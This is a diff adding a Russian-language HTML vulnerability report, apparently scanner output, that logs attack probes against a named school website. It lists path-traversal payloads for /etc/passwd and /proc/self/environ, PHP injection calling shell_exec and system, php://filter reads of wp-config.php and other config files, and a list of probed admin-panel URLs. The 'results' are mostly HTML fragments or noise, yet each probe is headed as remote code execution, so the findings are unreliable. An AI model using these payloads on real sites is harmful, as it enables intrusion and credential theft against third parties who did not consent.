+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #16</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../proc/self/environ</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #17</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo "RCE_TEST"; ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">RCE_TEST</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #18</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo file_get_contents("/etc/passwd"); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #19</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo shell_exec("id"); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #20</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo system("ls -la"); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #21</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">&lt;?php echo phpinfo(); ?&gt;</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> php_code</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выполнение PHP кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;html</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #22</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../config/database.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #23</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../wp-config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #24</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #25</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../configuration.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #26</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">php://filter/convert.base64-encode/resource=../includes/config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> filter_wrappers</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Использование PHP filter wrapper для чтения исходного кода</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">jכjڞw</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #27</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/passwd</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #28</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../etc/hosts</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #29</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/index.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #30</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #31</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../var/www/html/wp-config.php</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="vulnerability">
+                    <h2>🔴 ЭКСПЛУАТАЦИЯ УДАЛЕННОГО ВЫПОЛНЕНИЯ КОДА (RCE) #32</h2>
+                    <div class="vuln-details">
+                        <p><strong>URL точки внедрения:</strong> https://sch5-bogorodsk.edumsko.ru</p>
+                        <p><strong>Метод запроса:</strong> <span class="method get">GET</span></p>
+                        <p><strong>Уязвимый параметр:</strong> <code>q</code></p>
+                        
+                        <p><strong>Использованный payload:</strong></p>
+                        <pre class="payload">../../../proc/self/environ</pre>
+                        
+                        <p><strong>Тип эксплуатации:</strong> path_traversal</p>
+                        
+                        <div class="technique-box">
+                            <p><strong>Техника эксплуатации:</strong> Выход за пределы корневой директории (path traversal)</p>
+                        </div>
+                        
+                        <p><strong>Результат выполнения:</strong></p>
+                        <pre class="extracted-data">&lt;!DOCTYPE</pre>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Избегать использования функций exec/eval/system с пользовательскими данными</li>
+                                <li>Проверять имена файлов и пути через белые списки</li>
+                                <li>Ограничивать доступ к файловой системе</li>
+                                <li>Использовать chroot окружения при необходимости</li>
+                                <li>Применять последние обновления безопасности</li>
+                                <li>Использовать WAF для блокировки подозрительных запросов</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                
+            <div class="vulnerability">
+                <h2>🔴 ОБНАРУЖЕНЫ АДМИНИСТРАТИВНЫЕ ИНТЕРФЕЙСЫ (31)</h2>
+            
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #1</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/wp-admin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #2</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/adm</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #3</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/siteadmin/index.php</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #4</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/siteadmin/login.html</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #5</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/bb-admin/index.php</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #6</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/webadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #7</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #8</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpMyAdmin</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #9</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmin0</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
+                    
+                    <div class="admin-panel">
+                        <h3>🔹 Админ-панель #10</h3>
+                        <p><strong>URL:</strong> https://sch5-bogorodsk.edumsko.ru/phpmyadmin1</p>
+                        <p><strong>Статус:</strong> Обнаружена (доступ не получен)</p>
+                    
+                        <p><strong>Заголовок страницы:</strong> 404</p>
+                        
+                        <div class="rec-box">
+                            <p><strong>Рекомендации:</strong></p>
+                            <ul>
+                                <li>Использовать сложные пароли</li>
+                                <li>Внедрить двухфакторную аутентификацию</li>
+                                <li>Ограничить доступ к панели по IP-адресу</li>
+                                <li>Изменить стандартные пути к админ-панели</li>
+                            </ul>
+                        </div>
+                    </div>
